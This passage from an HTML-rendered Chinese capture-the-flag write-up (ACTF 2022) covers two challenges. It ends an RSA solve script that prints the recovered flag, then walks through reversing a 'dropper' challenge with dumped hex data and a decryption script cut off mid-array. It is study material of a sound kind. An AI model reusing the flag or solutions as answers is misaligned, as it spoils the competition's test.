</span></span><span class=line><span class=cl><span class=n>q</span><span class=o>=</span><span class=p>(</span><span class=o>-</span><span class=n>B</span><span class=o>+</span><span class=n>isqrt</span><span class=p>(</span><span class=n>B</span><span class=o>^</span><span class=mi>2</span><span class=o>-</span><span class=mi>4</span><span class=o>*</span><span class=n>A</span><span class=o>*</span><span class=n>C</span><span class=p>))</span><span class=o>//</span><span class=p>(</span><span class=mi>2</span><span class=o>*</span><span class=n>A</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>=</span><span class=n>n</span><span class=o>//</span><span class=n>q</span>
</span></span><span class=line><span class=cl><span class=n>phi</span><span class=o>=</span><span class=p>(</span><span class=n>p</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span><span class=o>*</span><span class=p>(</span><span class=n>q</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>d</span><span class=o>=</span><span class=n>gmpy2</span><span class=o>.</span><span class=n>invert</span><span class=p>(</span><span class=n>e</span><span class=p>,</span><span class=n>phi</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>m</span><span class=o>=</span><span class=nb>pow</span><span class=p>(</span><span class=n>c</span><span class=p>,</span><span class=n>d</span><span class=p>,</span><span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=n>m</span><span class=p>)[</span><span class=mi>2</span><span class=p>:]))</span>
</span></span><span class=line><span class=cl><span class=c1># b&#39;ACTF{lsb_attack_in_RSA|a32d7f}&#39;</span>
</span></span></code></pre></td></tr></table></div></div><h1 id=rev>Rev</h1><h2 id=dropper>dropper</h2><p>首先程序打开 大致看下思路 给人的感觉就是他这个题好像就是两个大整数再balabala</p><p>最后这个地方应该就是做差</p><p><img src=/img/2022-ACTF-SU-Writeup/165689627196925.png alt></p><p>一开始程序调试期间遇到了除0异常 在其他地方下断点即可</p><p><img src=/img/2022-ACTF-SU-Writeup/165689627791828.png alt></p><p>这个地方确定了大小</p><p><img src=/img/2022-ACTF-SU-Writeup/165689628168731.png alt></p><p><img src=/img/2022-ACTF-SU-Writeup/165689628604434.png alt></p><p><img src=/img/2022-ACTF-SU-Writeup/165689628945437.png alt></p><p><img src=/img/2022-ACTF-SU-Writeup/165689629281140.png alt></p><p>之后</p><p>是解密字符串数据后进行逆序的4个一组切割字符串并转换为int，还原出一个大数的操作</p><p>dump出密文 取出运算数据</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-JSON data-lang=JSON><span class=line><span class=cl><span class=p>[[</span><span class=mi>0</span><span class=err>x</span><span class=mi>000024</span><span class=err>AC</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00000116</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>000004</span><span class=err>F</span><span class=mi>4</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00000</span><span class=err>B</span><span class=mi>64</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00001</span><span class=err>DC</span><span class=mi>3</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00001</span><span class=err>B</span><span class=mi>4</span><span class=err>A</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>000001</span><span class=err>B</span><span class=mi>2</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00001</span><span class=err>FCE</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>0000</span><span class=mf>0E81</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>000025</span><span class=err>AB</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>0000015</span><span class=err>B</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>0000252</span><span class=err>D</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>000002</span><span class=err>AC</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00000</span><span class=err>F</span><span class=mi>77</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>000022</span><span class=err>F</span><span class=mi>5</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>0000</span><span class=mf>19E3</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00001</span><span class=err>C</span><span class=mi>53</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00000</span><span class=err>B</span><span class=mi>66</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>000011</span><span class=err>BC</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>0000193</span><span class=err>A</span><span class=p>],</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>0</span><span class=err>x</span><span class=mi>00000</span><span class=err>DC</span><span class=mi>6</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00000854</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>000015</span><span class=err>F</span><span class=mi>5</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00002567</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>000008</span><span class=err>FA</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>0000</span><span class=mf>0E20</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00000807</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00001007</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>000018</span><span class=err>CC</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>0000</span><span class=mf>1E84</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00001</span><span class=err>F</span><span class=mi>11</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>000013</span><span class=err>D</span><span class=mi>4</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>0000076</span><span class=err>A</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00001461</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00000</span><span class=err>B</span><span class=mi>0</span><span class=err>F</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00001</span><span class=err>F</span><span class=mi>70</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00001</span><span class=err>B</span><span class=mi>3</span><span class=err>D</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00001008</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00000</span><span class=err>D</span><span class=mi>52</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>0000049</span><span class=err>A</span><span class=p>],</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>0</span><span class=err>x</span><span class=mi>00001</span><span class=err>A</span><span class=mi>89</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>0000</span><span class=mf>0E42</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>000000</span><span class=err>FA</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>0000100</span><span class=err>D</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>000014</span><span class=err>DD</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00001</span><span class=err>BFC</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>000026</span><span class=err>DB</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00001</span><span class=err>AC</span><span class=mi>2</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00001</span><span class=err>CA</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>000005</span><span class=err>ED</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00000834</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>000016</span><span class=err>BF</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00000704</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00001</span><span class=err>FAD</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>000025</span><span class=err>FD</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00001142</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00001</span><span class=err>EEE</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>0000</span><span class=mf>1E60</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00000353</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>000015</span><span class=err>A</span><span class=mi>8</span><span class=p>],</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>0</span><span class=err>x</span><span class=mi>0000</span><span class=mf>0E17</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00000706</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00000</span><span class=err>C</span><span class=mi>1</span><span class=err>F</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00000169</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00002248</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>000007</span><span class=err>FD</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00001768</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00001</span><span class=err>F</span><span class=mi>54</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00001574</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00002458</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00000374</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00001</span><span class=err>D</span><span class=mi>6</span><span class=err>B</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00000918</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00000</span><span class=err>ECF</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>0000211</span><span class=err>D</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00001</span><span class=err>D</span><span class=mi>96</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00001</span><span class=err>BEB</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00001703</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00001</span><span class=err>B</span><span class=mi>87</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>000006</span><span class=err>FA</span><span class=p>],</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>0</span><span class=err>x</span><span class=mi>00000</span><span class=err>AE</span><span class=mi>3</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>0000069</span><span class=err>F</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>000001</span><span class=err>EF</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00001</span><span class=err>C</span><span class=mi>15</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00001378</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>000020</span><span class=err>D</span><span class=mi>1</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>0000211</span><span class=err>D</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00002275</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>000005</span><span class=err>F</span><span class=mi>4</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00002475</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00000</span><span class=err>D</span><span class=mi>13</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>000008</span><span class=err>EF</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>0000</span><span class=mf>0E10</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>000006</span><span class=err>D</span><span class=mi>4</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>0000215</span><span class=err>A</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>000004</span><span class=err>D</span><span class=mi>6</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>0000202</span><span class=err>F</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00001</span><span class=err>B</span><span class=mi>99</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00001</span><span class=err>C</span><span class=mi>86</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>000002</span><span class=err>F</span><span class=mi>1</span><span class=p>],</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>0</span><span class=err>x</span><span class=mi>00000680</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>000000</span><span class=err>D</span><span class=mi>4</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00000677</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>0000</span><span class=mf>1E21</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>0000220</span><span class=err>D</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00000933</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00000973</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00001947</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00000</span><span class=err>D</span><span class=mi>61</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>0000247</span><span class=err>F</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00001</span><span class=err>D</span><span class=mi>21</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00001</span><span class=err>FA</span><span class=mi>2</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00001606</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>000007</span><span class=err>B</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00001829</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>000016</span><span class=err>C</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>000026</span><span class=err>C</span><span class=mi>9</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>0000248</span><span class=err>C</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00000</span><span class=err>C</span><span class=mi>9</span><span class=err>A</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00001</span><span class=err>F</span><span class=mi>8</span><span class=err>F</span><span class=p>],</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>0</span><span class=err>x</span><span class=mi>0000257</span><span class=err>F</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00000359</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00001831</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>000021</span><span class=err>B</span><span class=mi>7</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00000</span><span class=err>BA</span><span class=mi>8</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00000</span><span class=err>FC</span><span class=mi>5</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00000</span><span class=err>BA</span><span class=mi>4</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>0000</span><span class=mf>24E2</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00001241</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00000</span><span class=err>D</span><span class=mi>53</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00000</span><span class=err>C</span><span class=mi>82</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00001240</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00002241</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00001156</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>0000116</span><span class=err>A</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>000005</span><span class=err>F</span><span class=mi>3</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>000022</span><span class=err>D</span><span class=mi>5</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>000008</span><span class=err>DA</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>000014</span><span class=err>A</span><span class=mi>3</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>0000059</span><span class=err>E</span><span class=p>],</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>0</span><span class=err>x</span><span class=mi>00001675</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00000</span><span class=err>AA</span><span class=mi>9</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00000</span><span class=err>D</span><span class=mi>8</span><span class=err>B</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00000</span><span class=err>D</span><span class=mi>31</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00001722</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>000006</span><span class=err>C</span><span class=mi>8</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>0000151</span><span class=err>B</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>000017</span><span class=err>D</span><span class=mi>8</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00001</span><span class=err>FEF</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00001624</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00002307</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00000</span><span class=err>CB</span><span class=mi>9</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>0000053</span><span class=err>C</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00000230</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00001</span><span class=err>EAA</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00001</span><span class=err>FD</span><span class=mi>1</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00000</span><span class=err>FAD</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>0000</span><span class=mf>1E30</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00002345</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00001583</span><span class=p>],</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>0</span><span class=err>x</span><span class=mi>000001</span><span class=err>D</span><span class=mi>1</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>0000056</span><span class=err>E</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00000</span><span class=err>AA</span><span class=mi>3</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>0000223</span><span class=err>C</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>000009</span><span class=err>A</span><span class=mi>4</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>000006</span><span class=err>C</span><span class=mi>9</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00000112</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00001977</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00002512</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00000</span><span class=err>B</span><span class=mi>60</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>0000081</span><span class=err>A</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00000</span><span class=err>F</span><span class=mi>06</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00001329</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>000011</span><span class=err>AA</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00002404</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>0000</span><span class=mf>0E57</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>0000011</span><span class=err>E</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>000011</span><span class=err>DC</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00002474</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00001</span><span class=err>BC</span><span class=mi>7</span><span class=p>],</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>0</span><span class=err>x</span><span class=mi>000022</span><span class=err>BE</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00001</span><span class=err>F</span><span class=mi>17</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00000588</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00001</span><span class=err>B</span><span class=mi>80</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00001479</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>000016</span><span class=err>EF</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>000008</span><span class=err>CA</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00000</span><span class=err>D</span><span class=mi>6</span><span class=err>E</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>0000138</span><span class=err>F</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00001054</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>000021</span><span class=err>FA</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00000102</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>000013</span><span class=err>A</span><span class=mi>6</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00000195</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>000002</span><span class=err>D</span><span class=mi>1</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00002594</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00001369</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>00002534</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>000015</span><span class=err>C</span><span class=mi>5</span><span class=p>,</span> <span class=mi>0</span><span class=err>x</span><span class=mi>0000168</span><span class=err>A</span><span class=p>]]</span>
</span></span></code></pre></td></tr></table></div></div><p>运算过程</p><p><img src=/img/2022-ACTF-SU-Writeup/165689630148543.png alt></p><p>脚本解密即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl> <span class=c1>#_*_coding:utf-8_*_</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl><span class=n>data</span> <span class=o>=</span> <span class=p>[[</span><span class=mh>0x000024AC</span><span class=p>,</span> <span class=mh>0x00000116</span><span class=p>,</span> <span class=mh>0x000004F4</span><span class=p>,</span> <span class=mh>0x00000B64</span><span class=p>,</span> <span class=mh>0x00001DC3</span><span class=p>,</span> <span class=mh>0x00001B4A</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>        <span class=mh>0x000001B2</span><span class=p>,</span> <span class=mh>0x00001FCE</span><span class=p>,</span> <span class=mh>0x00000E81</span><span class=p>,</span> <span class=mh>0x000025AB</span><span class=p>,</span> <span class=mh>0x0000015B</span><span class=p>,</span> <span class=mh>0x0000252D</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>        <span class=mh>0x000002AC</span><span class=p>,</span> <span class=mh>0x00000F77</span><span class=p>,</span> <span class=mh>0x000022F5</span><span class=p>,</span> <span class=mh>0x000019E3</span><span class=p>,</span> <span class=mh>0x00001C53</span><span class=p>,</span> <span class=mh>0x00000B66</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>        <span class=mh>0x000011BC</span><span class=p>,</span> <span class=mh>0x0000193A</span><span class=p>],[</span><span class=mh>0x00000DC6</span><span class=p>,</span> <span class=mh>0x00000854</span><span class=p>,</span> <span class=mh>0x000015F5</span><span class=p>,</span> <span class=mh>0x00002567</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>        <span class=mh>0x000008FA</span><span class=p>,</span> <span class=mh>0x00000E20</span><span class=p>,</span> <span class=mh>0x00000807</span><span class=p>,</span> <span class=mh>0x00001007</span><span class=p>,</span> <span class=mh>0x000018CC</span><span class=p>,</span> <span class=mh>0x00001E84</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0x00001F11</span><span class=p>,</span> <span class=mh>0x000013D4</span><span class=p>,</span> <span class=mh>0x0000076A</span><span class=p>,</span> <span class=mh>0x00001461</span><span class=p>,</span> <span class=mh>0x00000B0F</span><span class=p>,</span> <span class=mh>0x00001F70</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=mh>0x00001B3D</span><span class=p>,</span> <span class=mh>0x00001008</span><span class=p>,</span> <span class=mh>0x00000D52</span><span class=p>,</span> <span class=mh>0x0000049A</span><span class=p>],[</span><span class=mh>0x00001A89</span><span class=p>,</span> <span class=mh>0x00000E42</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>        <span class=mh>0x000000FA</span><span class=p>,</span> <span class=mh>0x0000100D</span><span class=p>,</span> <span class=mh>0x000014DD</span><span class=p>,</span> <span class=mh>0x00001BFC</span><span class=p>,</span> <span class=mh>0x000026DB</span><span class=p>,</span> <span class=mh>0x00001AC2</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>        <span class=mh>0x00001CA0</span><span class=p>,</span> <span class=mh>0x000005ED</span><span class=p>,</span> <span class=mh>0x00000834</span><span class=p>,</span> <span class=mh>0x000016BF</span><span class=p>,</span> <span class=mh>0x00000704</span><span class=p>,</span> <span class=mh>0x00001FAD</span><span class=p>,</span> 
</span></span><span class=line><span class=cl>        <span class=mh>0x000025FD</span><span class=p>,</span> <span class=mh>0x00001142</span><span class=p>,</span> <span class=mh>0x00001EEE</span><span class=p>,</span> <span class=mh>0x00001E60</span><span class=p>,</span> <span class=mh>0x00000353</span><span class=p>,</span> <span class=mh>0x000015A8</span><span class=p>],</span>
